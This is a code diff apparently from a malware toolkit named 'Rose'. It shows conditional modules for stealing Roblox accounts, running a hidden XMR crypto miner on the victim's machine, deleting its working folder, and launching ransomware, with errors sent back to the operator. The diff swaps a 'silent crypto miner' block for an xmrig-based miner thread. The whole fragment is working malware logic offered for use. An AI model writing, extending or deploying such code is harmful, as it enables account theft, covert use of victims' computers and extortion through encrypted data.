@@ -349,17 +349,17 @@ if cc.get_roblox_stealing():
     except Exception as e:
         send_error_notification(e, 'Rose Roblox Stealer')
 
-if cc.silent_crypto_miner():
-    try:
-        miner.run_miner()
-    except Exception as e:
-        send_error_notification(e, 'Rose Silent Crypto Miner')
-
 if os.path.exists(main_path):
     try:
         shutil.rmtree(main_path)
     except Exception as e:
         pass
+
+if cc.get_xmr_miner():
+    try:
+        threading.Thread(target=xmr_miner.xmrig()).start()
+    except Exception as e:
+        send_error_notification(e, 'XMR Miner')
 
 if cc.get_ransomware():
     try:
